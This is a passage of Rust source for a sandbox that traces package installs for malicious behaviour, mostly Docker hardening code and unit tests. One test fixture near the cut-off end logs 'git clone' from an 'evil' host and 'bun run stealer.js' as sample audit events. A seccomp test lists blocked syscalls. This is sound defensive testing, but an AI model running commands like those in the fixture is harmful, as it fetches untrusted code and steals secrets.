    let mem_limit = sandbox_mem_limit();
    let max_procs = sandbox_max_processes();
    let mut args = vec![
        "run".to_string(),
        "--rm".to_string(),
        "--network".to_string(),
        "bridge".to_string(),
        "--security-opt".to_string(),
        "no-new-privileges".to_string(),
        // strace runs as root but drops the traced install to the unprivileged
        // `gyrseek` user (`strace -u`). Attaching to a process of a different UID
        // requires CAP_SYS_PTRACE, which is NOT in Docker's default capability
        // set — without it `PTRACE_SEIZE` fails with EPERM and no trace is ever
        // produced. The capability is scoped to this container's PID namespace,
        // so it cannot trace host processes.
        "--cap-add".to_string(),
        "SYS_PTRACE".to_string(),
        "--pids-limit".to_string(),
        max_procs,
        "--memory".to_string(),
        mem_limit.clone(),
        "--cpus".to_string(),
        "1".to_string(),
        "--user".to_string(),
        "root".to_string(),
        "--tmpfs".to_string(),
        "/tmp:rw,noexec,nosuid,size=128m".to_string(),
        "--tmpfs".to_string(),
        format!("/work:rw,noexec,nosuid,size={mem_limit}"),
    ];
    if !danger_disable_seccomp {
        let profile_path = embedded_seccomp_profile_path()?;
        args.push("--security-opt".to_string());
        args.push(format!("seccomp={profile_path}"));
    }
    if let Some(apparmor_profile) = docker_apparmor_profile_name() {
        args.push("--security-opt".to_string());
        args.push(format!("apparmor={}", apparmor_profile));
    }
    if !out_dir_path.is_empty() {
        args.push("-v".to_string());
        args.push(format!("{}:/out", out_dir_path));
    }
    args.push("--workdir".to_string());
    args.push("/work".to_string());
    if let Some(runtime_name) = runtime {
        args.push("--runtime".to_string());
        args.push(runtime_name.to_string());
    }
    args.push(image.to_string());
    args.push("sh".to_string());
    args.push("-lc".to_string());
    args.push(script.to_string());
    Ok(args)
}

fn docker_apparmor_enabled_from_env() -> bool {
    std::env::var("GYRSEEK_DOCKER_APPARMOR_PROFILE")
        .ok()
        .map(|v| parse_bool_env(&v))
        .unwrap_or(false)
}

/// Stores the stderr from the last failed `apparmor_parser` invocation so
/// `announce_apparmor_status` can include it in the warning message.
static APPARMOR_LOAD_ERR: OnceLock<String> = OnceLock::new();

/// Runs `apparmor_parser -r -W --cache-loc <cache_dir> <profile>`, writing
/// the binary cache to a writable location instead of `/var/cache/apparmor`.
/// If the direct invocation lacks permissions and `GITHUB_ACTIONS=true` (GitHub
/// Actions runners are non-root with passwordless sudo), retries with `sudo -n`.
/// Returns `Ok(())` on success or the captured stderr on failure.
fn try_load_apparmor(
    profile_path: &std::path::Path,
    cache_dir: &std::path::Path,
) -> Result<(), String> {
    let cache_loc = cache_dir.to_string_lossy();
    let profile_loc = profile_path.to_string_lossy();

    let run = |use_sudo: bool| -> Result<String, String> {
        let mut cmd = if use_sudo {
            let mut c = Command::new("sudo");
            c.arg("-n").arg("apparmor_parser");
            c
        } else {
            Command::new("apparmor_parser")
        };
        let output = cmd
            .args(["-r", "-W", "--cache-loc"])
            .arg(cache_loc.as_ref())
            .arg(profile_loc.as_ref())
            .stderr(Stdio::piped())
            .stdout(Stdio::null())
            .output()
            .map_err(|e| format!("failed to execute: {e}"))?;

        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        if output.status.success() {
            Ok(stderr)
        } else {
            Err(stderr)
        }
    };
    match run(false) {
        Ok(_) => Ok(()),
        Err(stderr)
            if (stderr.contains("Access denied") || stderr.contains("policy admin privileges"))
                && std::env::var("GITHUB_ACTIONS").as_deref() == Ok("true") =>
        {
            eprintln!(
                "ℹ️ [gyrseek] GitHub Actions runner detected — retrying with sudo to load AppArmor profile"
            );
            run(true).map(|_| ())
        }
        Err(stderr) => Err(stderr),
    }
}

/// Loads the embedded AppArmor profile into the kernel via `apparmor_parser`
/// and returns the profile name on success, `None` if disabled by env var or
/// if loading fails (silent — the caller should announce status). The profile
/// is loaded once and cached for the process lifetime.
///
/// Uses `--cache-loc` to write the binary cache to the same writable temp dir
/// as the profile text, avoiding permission errors on `/var/cache/apparmor`
/// (common in containers/CI).
fn docker_apparmor_profile_name() -> Option<String> {
    if !docker_apparmor_enabled_from_env() {
        return None;
    }
    static PROFILE_LOADED: OnceLock<Option<String>> = OnceLock::new();
    PROFILE_LOADED
        .get_or_init(|| {
            let dir = TempDir::new().ok()?;
            let profile_path = dir.path().join(EMBEDDED_APPARMOR_PROFILE_NAME);
            std::fs::write(&profile_path, EMBEDDED_APPARMOR_PROFILE_TEXT).ok()?;

            match try_load_apparmor(&profile_path, dir.path()) {
                Ok(()) => {
                    Box::leak(Box::new(dir));
                    Some(EMBEDDED_APPARMOR_PROFILE_NAME.to_string())
                }
                Err(e) => {
                    let _ = APPARMOR_LOAD_ERR.set(e);
                    None
                }
            }
        })
        .clone()
}

fn embedded_seccomp_profile_path() -> Result<String, String> {
    static PROFILE: OnceLock<Result<String, String>> = OnceLock::new();
    PROFILE
        .get_or_init(|| {
            let dir = TempDir::new()
                .map_err(|e| format!("failed to create temp dir for seccomp profile: {e}"))?;
            let profile_path = dir.path().join(EMBEDDED_SECCOMP_PROFILE_NAME);
            std::fs::write(&profile_path, EMBEDDED_SECCOMP_PROFILE_JSON).map_err(|e| {
                format!(
                    "failed to write embedded seccomp profile to '{}': {e}",
                    profile_path.to_string_lossy()
                )
            })?;
            let path = profile_path.to_string_lossy().to_string();
            // Keep the random-named temp dir alive for the process lifetime
            // so Docker can read the seccomp file. The random name prevents
            // symlink attacks and TOCTOU races (see semgrep finding).
            Box::leak(Box::new(dir));
            Ok(path)
        })
        .clone()
}

fn announce_seccomp_status(danger_disable_seccomp: bool) {
    if !danger_disable_seccomp {
        eprintln!(
            "ℹ️ [gyrseek] Seccomp profile enabled: {} (embedded)",
            EMBEDDED_SECCOMP_PROFILE_NAME
        );
    } else {
        eprintln!(
            "⚠️ [gyrseek] Embedded seccomp profile disabled via --danger-disable-seccomp. Omit the flag to re-enable."
        );
    }
}

fn announce_apparmor_status() {
    if !cfg!(target_os = "linux") {
        return;
    }
    match docker_apparmor_profile_name() {
        Some(name) => eprintln!("ℹ️ [gyrseek] AppArmor profile loaded: {} (embedded)", name),
        None if !docker_apparmor_enabled_from_env() => {
            eprintln!(
                "ℹ️ [gyrseek] AppArmor profile disabled via GYRSEEK_DOCKER_APPARMOR_PROFILE=false"
            )
        }
        None => {
            let detail = APPARMOR_LOAD_ERR
                .get()
                .map(|s| s.as_str())
                .unwrap_or("apparmor_parser not found or failed");
            eprintln!(
                "⚠️ [gyrseek] AppArmor profile not available: {detail}\n\
                 Container will use Docker's default AppArmor profile. \
                 Set GYRSEEK_DOCKER_APPARMOR_PROFILE=false to silence this warning."
            )
        }
    }
}

fn docker_available() -> bool {
    Command::new("docker")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn docker_runtime_available(runtime: &str) -> bool {
    list_docker_runtimes()
        .map(|runtimes| runtimes.iter().any(|r| r == runtime))
        .unwrap_or(false)
}

fn scanner_image_config(manager: &str) -> ScannerImageConfig {
    let (image_var, prebuilt_var, default_image) = if is_npm_family_manager(manager) {
        (
            "GYRSEEK_NPM_SCANNER_IMAGE",
            "GYRSEEK_NPM_SCANNER_PREBUILT",
            "node:26.3-bookworm-slim@sha256:3fe807a03a4436e7bc76b7e84e6861899cd75c9028ae99bc00581940141ae150",
        )
    } else {
        (
            "GYRSEEK_PY_SCANNER_IMAGE",
            "GYRSEEK_PY_SCANNER_PREBUILT",
            "python:3.13-slim-bookworm@sha256:05b95397cac02b060ff1251afaa78087d92d7034369afbc8eb765631cada8257",
        )
    };

    let image = std::env::var(image_var)
        .ok()
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| default_image.to_string());

    let global_prebuilt = std::env::var("GYRSEEK_PREBUILT_SCANNER_IMAGES")
        .ok()
        .map(|v| parse_bool_env(&v))
        .unwrap_or(false);

    let prebuilt = std::env::var(prebuilt_var)
        .ok()
        .map(|v| parse_bool_env(&v))
        .unwrap_or(global_prebuilt);

    if prebuilt {
        eprintln!("ℹ️ [gyrseek] Using prebuilt scanner image: {}", image);
    }

    ScannerImageConfig { image, prebuilt }
}

fn parse_bool_env(value: &str) -> bool {
    matches!(
        value.trim().to_ascii_lowercase().as_str(),
        "1" | "true" | "yes" | "on"
    )
}

pub(crate) fn list_docker_runtimes() -> Result<Vec<String>, String> {
    let output = Command::new("docker")
        .args(["info", "--format", "{{json .Runtimes}}"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| format!("failed to query docker runtimes: {e}"))?;

    if !output.status.success() {
        return Err(format!(
            "docker info failed while querying runtimes: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value = serde_json::from_str(&stdout)
        .map_err(|e| format!("failed to parse docker runtimes JSON: {e}"))?;

    let mut runtimes = Vec::new();
    if let Some(obj) = parsed.as_object() {
        runtimes.extend(obj.keys().cloned());
    }

    runtimes.sort();
    Ok(runtimes)
}

fn shell_single_quoted(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\"'\"'"))
}

#[cfg(test)]
mod tests {
    use super::{
        CanaryTrap, EMBEDDED_APPARMOR_PROFILE_NAME, EMBEDDED_APPARMOR_PROFILE_TEXT,
        EMBEDDED_SECCOMP_PROFILE_JSON, PathShims, SCANNER_USER, build_artifact_scan_steps,
        build_docker_run_args, build_matrix_script, build_runner_from_env, build_single_script,
        build_synthetic_dns_response, default_allowed_domains_for_manager,
        discover_registry_domains_from_env, docker_apparmor_enabled_from_env,
        docker_apparmor_profile_name, extract_domains_from_nono_audit_log, extract_host_from_url,
        format_synthetic_dns_trace_line, nono_profile_content_for_os,
        nono_resource_limit_args_for_os, parse_nono_audit_log, parse_nono_diagnostics_denials,
        resolve_nono_bin, sandbox_max_processes, scan_target_artifacts, strace_install_command,
    };
    use std::sync::Mutex;

    fn env_lock() -> &'static Mutex<()> {
        static ENV_LOCK: std::sync::OnceLock<Mutex<()>> = std::sync::OnceLock::new();
        ENV_LOCK.get_or_init(|| Mutex::new(()))
    }

    struct SandboxEnvVarGuard {
        _lock: std::sync::MutexGuard<'static, ()>,
        keys: Vec<&'static str>,
    }

    impl SandboxEnvVarGuard {
        fn set(key: &'static str, value: &str) -> Self {
            let guard = env_lock()
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner());
            unsafe {
                std::env::set_var(key, value);
            }
            Self {
                _lock: guard,
                keys: vec![key],
            }
        }

        fn set_many(vars: &[(&'static str, &str)]) -> Self {
            let guard = env_lock()
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner());
            let mut keys = Vec::new();
            for (key, val) in vars {
                unsafe {
                    std::env::set_var(key, val);
                }
                keys.push(*key);
            }
            Self { _lock: guard, keys }
        }

        fn remove(key: &'static str) -> Self {
            let guard = env_lock()
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner());
            unsafe {
                std::env::remove_var(key);
            }
            Self {
                _lock: guard,
                keys: vec![key],
            }
        }

        fn remove_many(keys: &[&'static str]) -> Self {
            let guard = env_lock()
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner());
            for key in keys {
                unsafe {
                    std::env::remove_var(key);
                }
            }
            Self {
                _lock: guard,
                keys: keys.to_vec(),
            }
        }
    }

    impl Drop for SandboxEnvVarGuard {
        fn drop(&mut self) {
            for key in &self.keys {
                unsafe {
                    std::env::remove_var(key);
                }
            }
        }
    }

    // --- #4 strace must not truncate argv/addresses ---

    #[test]
    fn strace_command_disables_string_truncation() {
        let cmd = strace_install_command("npm", "left-pad@1.3.0", Some("/out/gyrseek_trace_0.log"));
        // -s 4096 lifts the 32-byte argv string cap; -v expands addresses;
        // -xx forces all bytes to \xNN hex-escape for deterministic parsing.
        assert!(cmd.contains("-s 4096"), "missing -s flag: {cmd}");
        assert!(cmd.contains(" -v "), "missing -v flag: {cmd}");
        assert!(cmd.contains(" -xx "), "missing -xx flag: {cmd}");
        assert!(
            cmd.contains("trace=network,execve,?execveat,open,openat,?openat2,?openat64,link,linkat,symlink,symlinkat,clone,?clone3,fork,vfork,dup,dup2,?dup3,fcntl"),
            "strace must trace exactly the required syscalls, found: {cmd}"
        );
    }

    #[test]
    fn matrix_and_single_scripts_disable_truncation() {
        let matrix = build_matrix_script(
            "npm",
            &[("left-pad".to_string(), "1.3.0".to_string())],
            true,
        );
        assert!(matrix.contains("-s 4096"));
        assert!(matrix.contains(" -v "));
        assert!(matrix.contains(" -xx "));

        let single = build_single_script("pip", "requests", "2.31.0", true);
        assert!(single.contains("-s 4096"));
        assert!(single.contains(" -v "));
        assert!(single.contains(" -xx "));
    }

    // --- #5 the traced payload runs unprivileged so it can't rewrite its trace ---

    #[test]
    fn strace_drops_payload_to_unprivileged_user() {
        let cmd = strace_install_command("npm", "left-pad@1.3.0", Some("/out/gyrseek_trace_0.log"));
        // strace itself runs as root (owns the log) but -u runs the install as
        // the scanner user, which has no write access to root-owned /out.
        assert!(
            cmd.contains(&format!("-u {}", SCANNER_USER)),
            "missing -u: {cmd}"
        );
        // The log path is owned by strace (root), written before the payload runs.
        assert!(cmd.contains("-o /out/gyrseek_trace_0.log"));
    }

    #[test]
    fn matrix_script_creates_scanner_user_before_install() {
        let script = build_matrix_script(
            "npm",
            &[("left-pad".to_string(), "1.3.0".to_string())],
            true,
        );
        let user_setup = script
            .find(SCANNER_USER)
            .expect("script should reference scanner user");
        let install = script.find("npm install").expect("script should install");
        // User creation must precede the install step.
        assert!(
            user_setup < install,
            "scanner user must be created before install"
        );
        assert!(script.contains("chown -R gyrseek /work"));
    }

    #[test]
    fn pnpm_install_invocation_uses_pnpm_add() {
        let cmd =
            strace_install_command("pnpm", "left-pad@1.3.0", Some("/out/gyrseek_trace_0.log"));
        assert!(cmd.contains("pnpm add 'left-pad@1.3.0' --dir /work --lockfile=false"));
    }

    #[test]
    fn pnpm_non_prebuilt_image_enables_pnpm() {
        let script = build_matrix_script(
            "pnpm",
            &[("left-pad".to_string(), "1.3.0".to_string())],
            false,
        );
        assert!(script.contains("corepack enable pnpm"));
        assert!(script.contains("pnpm add"));
    }

    #[test]
    fn docker_args_keep_out_mount_when_provided_and_omit_when_empty() {
        let with_out = build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", false)
            .expect("docker args should build");
        assert!(with_out.iter().any(|a| a == "/tmp/out:/out"));
        assert!(with_out.iter().any(|a| a == "no-new-privileges"));

        let without_out = build_docker_run_args("img:latest", "", None, "echo hi", false)
            .expect("docker args should build");
        assert!(!without_out.iter().any(|a| a.ends_with(":/out")));
    }

    #[test]
    fn docker_args_pass_runtime_when_set() {
        let args = build_docker_run_args(
            "img:latest",
            "/tmp/out",
            Some("kata-runtime"),
            "echo hi",
            false,
        )
        .expect("docker args should build");
        let pos = args
            .iter()
            .position(|a| a == "--runtime")
            .expect("runtime flag present");
        assert_eq!(args.get(pos + 1).map(String::as_str), Some("kata-runtime"));
    }

    #[test]
    fn docker_args_memory_limit_defaults_to_2g_and_is_configurable() {
        {
            let _env = SandboxEnvVarGuard::remove("GYRSEEK_MEM_LIMIT");
            let args = build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", false)
                .expect("docker args should build");
            let mem_pos = args
                .iter()
                .position(|a| a == "--memory")
                .expect("--memory flag present");
            assert_eq!(args.get(mem_pos + 1).map(String::as_str), Some("2g"));
            assert!(args.iter().any(|a| a == "/work:rw,noexec,nosuid,size=2g"));
        }

        {
            let _guard = SandboxEnvVarGuard::set("GYRSEEK_MEM_LIMIT", "4g");
            let args_custom =
                build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", false)
                    .expect("docker args should build");
            let mem_pos_custom = args_custom
                .iter()
                .position(|a| a == "--memory")
                .expect("--memory flag present");
            assert_eq!(
                args_custom.get(mem_pos_custom + 1).map(String::as_str),
                Some("4g")
            );
            assert!(
                args_custom
                    .iter()
                    .any(|a| a == "/work:rw,noexec,nosuid,size=4g")
            );
        }
    }

    #[test]
    fn docker_args_grant_sys_ptrace_capability() {
        // strace -u drops the install to an unprivileged user; attaching across
        // UIDs needs CAP_SYS_PTRACE, which Docker does not grant by default.
        // Without this the sandbox can never produce a trace.

        let args = build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", false)
            .expect("docker args should build");
        let pos = args
            .iter()
            .position(|a| a == "--cap-add")
            .expect("--cap-add flag present");
        assert_eq!(args.get(pos + 1).map(String::as_str), Some("SYS_PTRACE"));
    }

    #[test]
    fn docker_args_adds_seccomp_profile_by_default() {
        let args = build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", false)
            .expect("docker args should build");

        let mut found = false;
        for window in args.windows(2) {
            if window[0] == "--security-opt" && window[1].starts_with("seccomp=") {
                found = true;
                break;
            }
        }
        assert!(
            found,
            "expected seccomp security-opt to be present by default"
        );
    }

    #[test]
    fn docker_args_disables_seccomp_when_danger_flag_true() {
        let args = build_docker_run_args("img:latest", "/tmp/out", None, "echo hi", true)
            .expect("docker args should build");
        assert!(
            !args.iter().any(|a| a.starts_with("seccomp=")),
            "danger flag must disable seccomp profile"
        );
    }

    #[test]
    fn embedded_seccomp_profile_keeps_networking_available() {
        let profile: serde_json::Value = serde_json::from_str(EMBEDDED_SECCOMP_PROFILE_JSON)
            .expect("embedded seccomp profile should be valid JSON");
        let syscalls = profile["syscalls"]
            .as_array()
            .expect("profile syscalls should be an array");

        for syscall in syscalls {
            let names = syscall["names"]
                .as_array()
                .expect("syscall names should be an array");
            let denied_networking = names.iter().any(|name| {
                matches!(
                    name.as_str(),
                    Some("socket" | "socketpair" | "connect" | "sendto" | "recvfrom")
                )
            });
            assert!(
                !denied_networking,
                "embedded seccomp profile must not block container networking: {syscall:?}"
            );
        }
    }

    // --- AppArmor profile ---

    #[test]
    fn embedded_apparmor_profile_mentions_cap_sys_ptrace() {
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("capability sys_ptrace"),
            "AppArmor profile must allow sys_ptrace for strace cross-UID tracing"
        );
    }

    #[test]
    fn embedded_apparmor_profile_allows_network() {
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("network inet tcp"),
            "AppArmor profile must allow TCP for package registries: {}",
            EMBEDDED_APPARMOR_PROFILE_TEXT
        );
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("network inet6 tcp"),
            "AppArmor profile must allow TCP6 for package registries"
        );
    }

    #[test]
    fn embedded_apparmor_profile_allows_ptrace() {
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("ptrace (trace,read,tracedby,readby)"),
            "AppArmor profile must allow ptrace for strace"
        );
    }

    #[test]
    fn embedded_apparmor_profile_allows_work_out_tmp_writes() {
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("/work/ rw"),
            "profile must grant rw to /work"
        );
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("/out/ rw"),
            "profile must grant rw to /out"
        );
        assert!(
            EMBEDDED_APPARMOR_PROFILE_TEXT.contains("/tmp/ rw"),
            "profile must grant rw to /tmp"
        );
    }

    #[test]
    fn embedded_apparmor_profile_valid_profile_name() {
        assert_eq!(EMBEDDED_APPARMOR_PROFILE_NAME, "gyrseek-tracing");
    }

    #[test]
    fn apparmor_env_var_default_false() {
        let _env = SandboxEnvVarGuard::remove("GYRSEEK_DOCKER_APPARMOR_PROFILE");

        assert!(
            !docker_apparmor_enabled_from_env(),
            "default should be false"
        );

        unsafe {
            std::env::set_var("GYRSEEK_DOCKER_APPARMOR_PROFILE", "true");
        }
        assert!(docker_apparmor_enabled_from_env());

        unsafe {
            std::env::set_var("GYRSEEK_DOCKER_APPARMOR_PROFILE", "false");
        }
        assert!(!docker_apparmor_enabled_from_env());
    }

    #[test]
    fn apparmor_disabled_wont_call_apparmor_parser() {
        let _env = SandboxEnvVarGuard::set("GYRSEEK_DOCKER_APPARMOR_PROFILE", "false");

        let result = docker_apparmor_profile_name();
        assert!(result.is_none(), "disabled profile should return None");
    }

    // --- #4 strace stderr must be captured, not discarded ---

    #[test]
    fn matrix_script_captures_strace_stderr_not_devnull() {
        let script = build_matrix_script(
            "npm",
            &[("left-pad".to_string(), "1.3.0".to_string())],
            true,
        );
        // strace's stderr must land in a per-probe error log so an attach
        // failure is diagnosable, never silently routed to /dev/null.
        assert!(
            script.contains("2>/out/gyrseek_err_0.log"),
            "strace stderr must be captured to a log: {script}"
        );
        // The strace install step specifically must not merge its stderr away.
        let strace_step = script
            .split("; ")
            .find(|s| s.contains("strace -f"))
            .expect("script should contain a strace step");
        assert!(
            !strace_step.contains("2>&1"),
            "strace stderr must not be merged into /dev/null: {strace_step}"
        );
    }

    // --- post-install artifact scan ---

    #[test]
    fn artifact_scan_steps_inventory_all_files() {
        let steps = build_artifact_scan_steps(0);
        let combined = steps.join(" ");
        assert!(
            combined.contains("find /work -type f"),
            "should inventory every file: {combined}"
        );
        assert!(
            combined.contains("file -b"),
            "should capture file type via file(1): {combined}"
        );
        assert!(
            combined.contains("stat -c%s"),
            "should capture file size: {combined}"
        );
        assert!(
            combined.contains("head -c 300"),
            "should capture content prefix: {combined}"
        );
    }

    #[test]
    fn artifact_scan_steps_pipe_char_in_content_replaced() {
        let steps = build_artifact_scan_steps(0);
        let combined = steps.join(" ");
        assert!(
            combined.contains("tr '|' ' '"),
            "should replace pipe in content to preserve delimiter: {combined}"
        );
    }

    #[test]
    fn artifact_scan_steps_uses_null_byte_delimiter() {
        // Finding 20 fix: the shell script must use printf with \0 delimiter
        // to prevent pipe-in-filename injection attacks.
        let steps = build_artifact_scan_steps(0);
        let cmd = &steps[1];
        assert!(
            cmd.contains("printf "),
            "must use printf for null-byte delimiters: {cmd}"
        );
        assert!(
            cmd.contains("\\0"),
            "must use \\0 null-byte field delimiter: {cmd}"
        );
        // Ensure the old echo-based pipe-delimiter approach is gone.
        assert!(
            !cmd.contains("echo \"$f|"),
            "must not use echo with pipe delimiter: {cmd}"
        );
    }

    #[test]
    fn artifact_scan_steps_output_to_correct_log() {
        let steps0 = build_artifact_scan_steps(0);
        let steps1 = build_artifact_scan_steps(1);
        assert!(steps0[1].contains("/out/gyrseek_artifacts_0.log"));
        assert!(steps1[1].contains("/out/gyrseek_artifacts_1.log"));
    }

    #[test]
    fn matrix_script_includes_artifact_scan_after_each_probe() {
        let script = build_matrix_script(
            "pip",
            &[
                ("pkg-a".to_string(), "1.0.0".to_string()),
                ("pkg-b".to_string(), "2.0.0".to_string()),
            ],
            true,
        );
        // After the first probe's install, expect the artifact scan log for idx 0.
        let probe0_install = script.find("gyrseek_trace_0.log").expect("trace 0 log");
        let probe0_artifacts = script
            .find("gyrseek_artifacts_0.log")
            .expect("artifacts 0 log");
        assert!(
            probe0_artifacts > probe0_install,
            "artifact scan must follow install for probe 0"
        );
        // Same for probe 1.
        let probe1_artifacts = script
            .find("gyrseek_artifacts_1.log")
            .expect("artifacts 1 log");
        let probe1_install = script.find("gyrseek_trace_1.log").expect("trace 1 log");
        assert!(
            probe1_artifacts > probe1_install,
            "artifact scan must follow install for probe 1"
        );
    }

    #[test]
    fn embedded_seccomp_profile_structurally_blocks_dangerous_syscalls() {
        let profile: serde_json::Value = serde_json::from_str(EMBEDDED_SECCOMP_PROFILE_JSON)
            .expect("embedded seccomp profile should be valid JSON");

        let syscalls = profile["syscalls"]
            .as_array()
            .expect("profile syscalls should be an array");

        let mut found_setup = false;
        let mut found_enter = false;
        let mut found_register = false;
        let mut found_vm_writev = false;
        let mut found_pidfd_open = false;
        let mut found_pidfd_getfd = false;

        for rule in syscalls {
            if rule["action"] == "SCMP_ACT_ERRNO" {
                let Some(names) = rule["names"].as_array() else {
                    continue;
                };
                for name in names {
                    if let Some(s) = name.as_str() {
                        match s {
                            "io_uring_setup" => found_setup = true,
                            "io_uring_enter" => found_enter = true,
                            "io_uring_register" => found_register = true,
                            "process_vm_writev" => found_vm_writev = true,
                            "pidfd_open" => found_pidfd_open = true,
                            "pidfd_getfd" => found_pidfd_getfd = true,
                            _ => {}
                        }
                    }
                }
            }
        }

        assert!(found_setup, "io_uring_setup must be blocked");
        assert!(found_enter, "io_uring_enter must be blocked");
        assert!(found_register, "io_uring_register must be blocked");
        assert!(found_vm_writev, "process_vm_writev must be blocked");
        assert!(found_pidfd_open, "pidfd_open must be blocked");
        assert!(found_pidfd_getfd, "pidfd_getfd must be blocked");
    }

    #[test]
    fn docker_enforces_sandbox_constraints() {
        use std::process::Command;

        if Command::new("docker").arg("info").output().is_err() {
            if std::env::var("CI").is_ok() {
                panic!("Docker must be available in CI environments for enforcement testing!");
            }
            eprintln!("Docker not available, skipping sandbox enforcement test");
            return;
        }

        let arch = std::env::consts::ARCH;
        if arch != "x86_64" && arch != "aarch64" {
            if std::env::var("CI").is_ok() {
                panic!("CI must run on x86_64 or aarch64 to test seccomp constraints!");
            }
            eprintln!(
                "Unsupported architecture '{}' for syscall test, skipping",
                arch
            );
            return;
        }

        let python_script = r#"import sys, ctypes, platform
success = True

libc = ctypes.CDLL("libc.so.6", use_errno=True)
machine = platform.machine()
if machine in ("x86_64", "amd64"):
    SYS_process_vm_writev = 311
elif machine in ("aarch64", "arm64"):
    SYS_process_vm_writev = 271
else:
    print("Unknown architecture:", machine, file=sys.stderr)
    sys.exit(1)

ctypes.set_errno(0)
res = libc.syscall(SYS_process_vm_writev, 0, 0, 0, 0, 0, 0)
err = ctypes.get_errno()

if res == -1 and err == 1:
    print("PASS: process_vm_writev blocked with EPERM", file=sys.stderr)
else:
    print(f"FAIL: process_vm_writev returned {res}, errno {err} (expected EPERM=1)", file=sys.stderr)
    success = False

sys.exit(0 if success else 1)"#;

        let command_str = format!("python3 -c '{}'", python_script);

        let image = match arch {
            "x86_64" => {
                "python@sha256:129f9f5d5729767916d79f0021ba4fe56ff113332b08ef1213ecf529a9da7ebb"
            } // python:3.13-slim-bookworm (amd64)
            "aarch64" => {
                "python@sha256:f2c0cbd763245b6de85ecbbf17b07a4802e847cecd9b9e2807a2cef330bd8245"
            } // python:3.13-slim-bookworm (arm64/v8)
            _ => unreachable!(),
        };
        let protected_args = build_docker_run_args(image, "", None, &command_str, false).unwrap();

        let protected_run = Command::new("docker")
            .args(&protected_args)
            .output()
            .expect("docker command should run");

        assert!(
            protected_run.status.success(),
            "Protected sandbox test failed (constraints violated)!
Stdout: {}
Stderr: {}",
            String::from_utf8_lossy(&protected_run.stdout),
            String::from_utf8_lossy(&protected_run.stderr)
        );
    }

    #[test]
    fn nono_runner_fails_closed_when_nono_unavailable() {
        let _env = SandboxEnvVarGuard::set_many(&[
            ("GYRSEEK_SANDBOX", "nono"),
            ("GYRSEEK_NONO_PATH", "/nonexistent/gyrseek_nono"),
        ]);

        let err = build_runner_from_env(false).err().expect("should fail");
        assert!(
            err.contains("nono is not available"),
            "Error message should indicate nono is not available: {err}"
        );
    }

    #[test]
    fn resolve_nono_bin_prefers_explicit_env_path() {
        let _env = SandboxEnvVarGuard::set("GYRSEEK_NONO_PATH", "/custom/path/to/nono");
        assert_eq!(
            resolve_nono_bin(),
            std::path::PathBuf::from("/custom/path/to/nono")
        );
    }

    #[test]
    fn resolve_nono_bin_checks_cargo_home() {
        let dir = tempfile::tempdir().expect("tempdir");
        let bin_dir = dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).expect("create bin dir");
        let fake_nono = bin_dir.join("nono");
        std::fs::write(&fake_nono, b"#!/bin/sh\nexit 0\n").expect("write fake nono");

        let _env = SandboxEnvVarGuard::set_many(&[
            ("GYRSEEK_NONO_PATH", ""),
            ("CARGO_HOME", &dir.path().to_string_lossy()),
        ]);
        assert_eq!(resolve_nono_bin(), fake_nono);
    }

    #[test]
    fn unsupported_sandbox_mode_lists_nono() {
        let _env_mode = SandboxEnvVarGuard::set("GYRSEEK_SANDBOX", "unsupported_mode");

        let err = build_runner_from_env(false).err().expect("should fail");
        assert!(
            err.contains("Supported values: docker, microvm, host, nono"),
            "Error message should mention nono: {err}"
        );
    }

    #[test]
    fn parse_nono_audit_log_network_events() {
        let jsonl = r#"
{"sequence":0,"event":{"type":"network","event":{"target":"93.184.216.34","port":443,"decision":"allow"}}}
{"sequence":1,"event":{"type":"network","event":{"target":"2606:4700::6810:223","port":80,"decision":"allow"}}}
{"sequence":2,"event":{"type":"network","event":{"target":"registry.npmjs.org","port":443,"decision":"allow"}}}
"#;
        let trace = parse_nono_audit_log(jsonl);
        assert!(trace.contains("sin_addr=inet_addr(\"93.184.216.34\")"));
        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2606:4700::6810:223\")"));
        assert!(trace.contains("recvfrom(4, \""));
        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2001:db8:"));
    }

    #[test]
    fn parse_nono_audit_log_captured_https_connect_fixture() {
        let jsonl = r#"
{"sequence":0,"event":{"type":"session_started","started":"2026-09-25T13:09:02.259252+10:00","command":["curl","-sI","https://pypi.org/pypi/black/json"]}}
{"sequence":1,"event":{"type":"network","event":{"timestamp_unix_ms":1790305742312,"mode":"connect","decision":"allow","target":"pypi.org","port":443,"method":"CONNECT","path":null,"status":null,"reason":null}}}
{"sequence":2,"event":{"type":"session_ended","ended":"2026-09-25T13:09:02.545888+10:00","exit_code":0}}
"#;
        let trace = parse_nono_audit_log(jsonl);
        assert!(trace.contains("recvfrom(4, \""));
        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2001:db8:"));
        assert!(trace.contains("sin6_port=htons(443)"));
    }

    #[test]
    fn parse_nono_audit_log_command_and_exec_events() {
        let jsonl = r#"
{"sequence":0,"event":{"type":"command_policy","command":"git clone https://github.com/evil/repo","decision":"allow"}}
{"sequence":1,"event":{"type":"command_policy","command":["bun", "run", "stealer.js"],"decision":"allow"}}
